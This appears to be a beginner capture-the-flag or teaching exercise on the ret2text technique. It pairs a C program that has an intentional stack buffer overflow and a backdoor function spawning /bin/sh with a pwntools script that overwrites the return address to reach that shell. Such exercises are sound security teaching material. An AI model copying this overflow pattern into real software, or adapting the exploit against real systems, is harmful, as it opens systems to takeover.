
题目：
```c
#include <stdio.h>
void init(){
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
}
void vuln(){
    char buf[8];
    puts(">>");
    read(0, buf, 0x100);
}
void backdoor(){
    system("/bin/sh");
}
int main(){
    init();
    vuln();
    return 0;
}

// gcc ret2text1.c -o ret2text1 -fno-stack-protector -no-pie

// gcc ret2text1.c -o ret2text1 -fno-stack-protector -no-pie -m32
```


```python
from pwn import *
#context(os='linux',arch='i386',log_level='debug')
p=process('./ret2text1_32')
elf = ELF('./ret2text1_32')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
bin_sh=0x8048643
bin_sh_chuancan=0x8048585
offset=20
payload=b"a"*offset + p32(bin_sh_chuancan)
p.sendline(payload)
p.interactive()

```